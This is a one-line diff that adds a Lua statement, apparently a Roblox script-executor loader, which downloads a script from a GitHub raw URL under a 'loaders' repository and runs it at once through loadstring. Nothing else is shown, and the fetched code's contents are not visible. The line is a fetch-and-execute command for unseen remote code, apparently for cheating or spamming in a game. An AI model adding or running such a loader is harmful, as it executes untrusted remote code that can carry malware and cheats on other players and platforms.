@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Swarmzorouter/loaders/main/loaders/huss-valley-spam7-tcm4u8a3k5jdtl.lua"))()
